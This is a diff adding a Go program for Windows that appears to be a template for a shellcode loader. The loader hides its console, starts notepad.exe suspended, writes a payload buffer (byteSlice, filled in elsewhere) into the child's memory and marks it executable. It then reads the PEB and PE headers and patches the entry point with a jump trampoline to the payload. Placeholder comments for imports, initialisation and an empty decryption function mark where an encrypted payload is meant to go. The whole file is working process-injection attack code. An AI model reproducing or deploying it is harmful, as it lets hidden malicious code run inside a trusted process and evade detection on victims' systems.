@@ -1,0 +1,482 @@
+package main
+
+import (
+	"encoding/binary"
+	"github.com/gonutz/ide/w32"
+	"golang.org/x/sys/windows"
+	"unsafe"
+	//__import__
+)
+
+
+func closeWindows(commandShow uintptr) {
+	console := w32.GetConsoleWindow()
+	if console != 0 {
+		_, consoleProcID := w32.GetWindowThreadProcessId(console)
+		if w32.GetCurrentProcessId() == consoleProcID {
+			w32.ShowWindowAsync(console, commandShow)
+		}
+	}
+}
+
+// 解密函数
+func f() {}
+
+func main() {
+	closeWindows(w32.SW_HIDE)
+
+	program := "C:\\Windows\\System32\\notepad.exe"
+	args := ""
+	//__init__
+	kernel32 := windows.NewLazyDLL("kernel32.dll")
+	ntdll := windows.NewLazyDLL("ntdll.dll")
+
+
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
+
+	// Create anonymous pipe for STDIN
+	// TODO I don't think I need this for anything
+	var stdInRead windows.Handle
+	var stdInWrite windows.Handle
+
+
+	errStdInPipe := windows.CreatePipe(&stdInRead, &stdInWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
+	if errStdInPipe != nil {
+
+	}
+
+
+	// Create anonymous pipe for STDOUT
+	var stdOutRead windows.Handle
+	var stdOutWrite windows.Handle
+
+	errStdOutPipe := windows.CreatePipe(&stdOutRead, &stdOutWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
+	if errStdOutPipe != nil {
+
+	}
+
+
+	// Create anonymous pipe for STDERR
+	var stdErrRead windows.Handle
+	var stdErrWrite windows.Handle
+
+	errStdErrPipe := windows.CreatePipe(&stdErrRead, &stdErrWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
+	if errStdErrPipe != nil {
+
+	}
+
+
+
+
+
+	procInfo := &windows.ProcessInformation{}
+	startupInfo := &windows.StartupInfo{
+		StdInput:   stdInRead,
+		StdOutput:  stdOutWrite,
+		StdErr:     stdErrWrite,
+		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+		ShowWindow: 1,
+	}
+	errCreateProcess := windows.CreateProcess(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
+	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
+
+	}
+
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(byteSlice)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+
+	}
+
+	if addr == 0 {
+
+	}
+
+
+
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
+
+	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
+
+	}
+
+	oldProtect := windows.PAGE_READWRITE
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(byteSlice)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
+
+	}
+
+
+	// Query the child process and find its image base address from its Process Environment Block (PEB)
+	// https://github.com/winlabs/gowin32/blob/0b6f3bef0b7501b26caaecab8d52b09813224373/wrappers/winternl.go#L37
+	// http://bytepointer.com/resources/tebpeb32.htm
+	// https://www.nirsoft.net/kernel_struct/vista/PEB.html
+	type PEB struct {
+		//reserved1              [2]byte     // BYTE 0-1
+		InheritedAddressSpace    byte    // BYTE	0
+		ReadImageFileExecOptions byte    // BYTE	1
+		BeingDebugged            byte    // BYTE	2
+		reserved2                [1]byte // BYTE 3
+		// ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
+		// IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
+		// IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
+		// IsImageDynamicallyRelocated  : 1;   //0x0003:3 (Vista+)
+		// SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
+		// IsPackagedProcess            : 1;   //0x0003:5 (Win8_BETA+)
+		// IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
+		// SpareBit                     : 1;   //0x0003:7
+		//reserved3              [2]uintptr  // PVOID BYTE 4-8
+		Mutant                 uintptr     // BYTE 4
+		ImageBaseAddress       uintptr     // BYTE 8
+		Ldr                    uintptr     // PPEB_LDR_DATA
+		ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
+		reserved4              [3]uintptr  // PVOID
+		AtlThunkSListPtr       uintptr     // PVOID
+		reserved5              uintptr     // PVOID
+		reserved6              uint32      // ULONG
+		reserved7              uintptr     // PVOID
+		reserved8              uint32      // ULONG
+		AtlThunkSListPtr32     uint32      // ULONG
+		reserved9              [45]uintptr // PVOID
+		reserved10             [96]byte    // BYTE
+		PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
+		reserved11             [128]byte   // BYTE
+		reserved12             [1]uintptr  // PVOID
+		SessionId              uint32      // ULONG
+	}
+
+	// https://github.com/elastic/go-windows/blob/master/ntdll.go#L77
+	type PROCESS_BASIC_INFORMATION struct {
+		reserved1                    uintptr    // PVOID
+		PebBaseAddress               uintptr    // PPEB
+		reserved2                    [2]uintptr // PVOID
+		UniqueProcessId              uintptr    // ULONG_PTR
+		InheritedFromUniqueProcessID uintptr    // PVOID
+	}
+
+
+
+	var processInformation PROCESS_BASIC_INFORMATION
+	var returnLength uintptr
+	ntStatus, _, errNtQueryInformationProcess := NtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
+	if errNtQueryInformationProcess != nil && errNtQueryInformationProcess.Error() != "The operation completed successfully." {
+
+	}
+	if ntStatus != 0 {
+		if ntStatus == 3221225476 {
+
+		}
+
+
+	}
+
+
+	// Read from PEB base address to populate the PEB structure
+	// ReadProcessMemory
+	/*
+		BOOL ReadProcessMemory(
+		HANDLE  hProcess,
+		LPCVOID lpBaseAddress,
+		LPVOID  lpBuffer,
+		SIZE_T  nSize,
+		SIZE_T  *lpNumberOfBytesRead
+		);
+	*/
+
+	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
+
+
+
+	var peb PEB
+	var readBytes int32
+
+	_, _, errReadProcessMemory := ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
+	if errReadProcessMemory != nil && errReadProcessMemory.Error() != "The operation completed successfully." {
+
+	}
+
+
+	// Read the child program's DOS header and validate it is a MZ executable
+	type IMAGE_DOS_HEADER struct {
+		Magic    uint16     // USHORT Magic number
+		Cblp     uint16     // USHORT Bytes on last page of file
+		Cp       uint16     // USHORT Pages in file
+		Crlc     uint16     // USHORT Relocations
+		Cparhdr  uint16     // USHORT Size of header in paragraphs
+		MinAlloc uint16     // USHORT Minimum extra paragraphs needed
+		MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
+		SS       uint16     // USHORT Initial (relative) SS value
+		SP       uint16     // USHORT Initial SP value
+		CSum     uint16     // USHORT Checksum
+		IP       uint16     // USHORT Initial IP value
+		CS       uint16     // USHORT Initial (relative) CS value
+		LfaRlc   uint16     // USHORT File address of relocation table
+		Ovno     uint16     // USHORT Overlay number
+		Res      [4]uint16  // USHORT Reserved words
+		OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
+		OEMInfo  uint16     // USHORT OEM information; e_oemid specific
+		Res2     [10]uint16 // USHORT Reserved words
+		LfaNew   int32      // LONG File address of new exe header
+	}
+
+
+
+	var dosHeader IMAGE_DOS_HEADER
+	var readBytes2 int32
+
+	_, _, errReadProcessMemory2 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
+	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
+
+	}
+
+
+	// 23117 is the LittleEndian unsigned base10 representation of MZ
+	// 0x5a4d is the LittleEndian unsigned base16 represenation of MZ
+	if dosHeader.Magic != 23117 {
+
+	}
+
+
+	var Signature uint32
+	var readBytes3 int32
+
+	_, _, errReadProcessMemory3 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
+	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
+
+	}
+
+
+	// 17744 is Little Endian Unsigned 32-bit integer in decimal for PE (null terminated)
+	// 0x4550 is Little Endian Unsigned 32-bit integer in hex for PE (null terminated)
+	if Signature != 17744 {
+
+	}
+
+
+
+	type IMAGE_FILE_HEADER struct {
+		Machine              uint16
+		NumberOfSections     uint16
+		TimeDateStamp        uint32
+		PointerToSymbolTable uint32
+		NumberOfSymbols      uint32
+		SizeOfOptionalHeader uint16
+		Characteristics      uint16
+	}
+
+
+	var peHeader IMAGE_FILE_HEADER
+	var readBytes4 int32
+
+	_, _, errReadProcessMemory4 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
+	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
+
+	}
+
+
+
+	type IMAGE_OPTIONAL_HEADER64 struct {
+		Magic                       uint16
+		MajorLinkerVersion          byte
+		MinorLinkerVersion          byte
+		SizeOfCode                  uint32
+		SizeOfInitializedData       uint32
+		SizeOfUninitializedData     uint32
+		AddressOfEntryPoint         uint32
+		BaseOfCode                  uint32
+		ImageBase                   uint64
+		SectionAlignment            uint32
+		FileAlignment               uint32
+		MajorOperatingSystemVersion uint16
+		MinorOperatingSystemVersion uint16
+		MajorImageVersion           uint16
+		MinorImageVersion           uint16
+		MajorSubsystemVersion       uint16
+		MinorSubsystemVersion       uint16
+		Win32VersionValue           uint32
+		SizeOfImage                 uint32
+		SizeOfHeaders               uint32
+		CheckSum                    uint32
+		Subsystem                   uint16
+		DllCharacteristics          uint16
+		SizeOfStackReserve          uint64
+		SizeOfStackCommit           uint64
+		SizeOfHeapReserve           uint64
+		SizeOfHeapCommit            uint64
+		LoaderFlags                 uint32
+		NumberOfRvaAndSizes         uint32
+		DataDirectory               uintptr
+	}
+
+
+
+	type IMAGE_OPTIONAL_HEADER32 struct {
+		Magic                       uint16
+		MajorLinkerVersion          byte
+		MinorLinkerVersion          byte
+		SizeOfCode                  uint32
+		SizeOfInitializedData       uint32
+		SizeOfUninitializedData     uint32
+		AddressOfEntryPoint         uint32
+		BaseOfCode                  uint32
+		BaseOfData                  uint32 // Different from 64 bit header
+		ImageBase                   uint64
+		SectionAlignment            uint32
+		FileAlignment               uint32
+		MajorOperatingSystemVersion uint16
+		MinorOperatingSystemVersion uint16
+		MajorImageVersion           uint16
+		MinorImageVersion           uint16
+		MajorSubsystemVersion       uint16
+		MinorSubsystemVersion       uint16
+		Win32VersionValue           uint32
+		SizeOfImage                 uint32
+		SizeOfHeaders               uint32
+		CheckSum                    uint32
+		Subsystem                   uint16
+		DllCharacteristics          uint16
+		SizeOfStackReserve          uint64
+		SizeOfStackCommit           uint64
+		SizeOfHeapReserve           uint64
+		SizeOfHeapCommit            uint64
+		LoaderFlags                 uint32
+		NumberOfRvaAndSizes         uint32
+		DataDirectory               uintptr
+	}
+
+
+
+	var optHeader64 IMAGE_OPTIONAL_HEADER64
+	var optHeader32 IMAGE_OPTIONAL_HEADER32
+	var errReadProcessMemory5 error
+	var readBytes5 int32
+
+	if peHeader.Machine == 34404 { // 0x8664
+		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
+	} else if peHeader.Machine == 332 { // 0x14c
+		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
+	} else {
+
+	}
+
+	if errReadProcessMemory5 != nil && errReadProcessMemory5.Error() != "The operation completed successfully." {
+
+	}
+
+
+	// Overwrite the value at AddressofEntryPoint field with trampoline to load the byteSlice address in RAX/EAX and jump to it
+	var ep uintptr
+	if peHeader.Machine == 34404 { // 0x8664 x64
+		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
+	} else if peHeader.Machine == 332 { // 0x14c x86
+		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
+	} else {
+
+	}
+
+	var epBuffer []byte
+	var byteSliceAddressBuffer []byte
+	// x86 - 0xb8 = mov eax
+	// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
+	if peHeader.Machine == 34404 { // 0x8664 x64
+		epBuffer = append(epBuffer, byte(0x48))
+		epBuffer = append(epBuffer, byte(0xb8))
+		byteSliceAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
+		binary.LittleEndian.PutUint64(byteSliceAddressBuffer, uint64(addr))
+		epBuffer = append(epBuffer, byteSliceAddressBuffer...)
+	} else if peHeader.Machine == 332 { // 0x14c x86
+		epBuffer = append(epBuffer, byte(0xb8))
+		byteSliceAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
+		binary.LittleEndian.PutUint32(byteSliceAddressBuffer, uint32(addr))
+		epBuffer = append(epBuffer, byteSliceAddressBuffer...)
+	} else {
+
+	}
+
+	// 0xff ; 0xe0 = jmp [r|e]ax
+	epBuffer = append(epBuffer, byte(0xff))
+	epBuffer = append(epBuffer, byte(0xe0))
+
+
+
+	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))
+
+	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
+
+	}
+
+
+
+	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
+	if errResumeThread != nil {
+
+	}
+
+	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
+	if errCloseProcHandle != nil {
+
+	}
+
+
+	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
+	if errCloseThreadHandle != nil {
+
+	}
+
+	// Close the write handle the anonymous STDOUT pipe
+	errCloseStdOutWrite := windows.CloseHandle(stdOutWrite)
+	if errCloseStdOutWrite != nil {
+
+	}
+
+	// Close the read handle to the anonymous STDIN pipe
+	errCloseStdInRead := windows.CloseHandle(stdInRead)
+	if errCloseStdInRead != nil {
+
+	}
+
+	errCloseStdErrWrite := windows.CloseHandle(stdErrWrite)
+	if errCloseStdErrWrite != nil {
+
+	}
+
+	nNumberOfBytesToRead := make([]byte, 1)
+	var stdOutBuffer []byte
+	var stdOutDone uint32
+	var stdOutOverlapped windows.Overlapped
+
+	for {
+		errReadFileStdOut := windows.ReadFile(stdOutRead, nNumberOfBytesToRead, &stdOutDone, &stdOutOverlapped)
+		if errReadFileStdOut != nil && errReadFileStdOut.Error() != "The pipe has been ended." {
+
+		}
+		if int(stdOutDone) == 0 {
+			break
+		}
+		for _, b := range nNumberOfBytesToRead {
+			stdOutBuffer = append(stdOutBuffer, b)
+		}
+	}
+
+
+	// Read STDERR from child process
+	var stdErrBuffer []byte
+	var stdErrDone uint32
+	var stdErrOverlapped windows.Overlapped
+
+	for {
+		errReadFileStdErr := windows.ReadFile(stdErrRead, nNumberOfBytesToRead, &stdErrDone, &stdErrOverlapped)
+		if errReadFileStdErr != nil && errReadFileStdErr.Error() != "The pipe has been ended." {
+
+		}
+		if int(stdErrDone) == 0 {
+			break
+		}
+		for _, b := range nNumberOfBytesToRead {
+			stdErrBuffer = append(stdErrBuffer, b)
+		}
+	}
+}
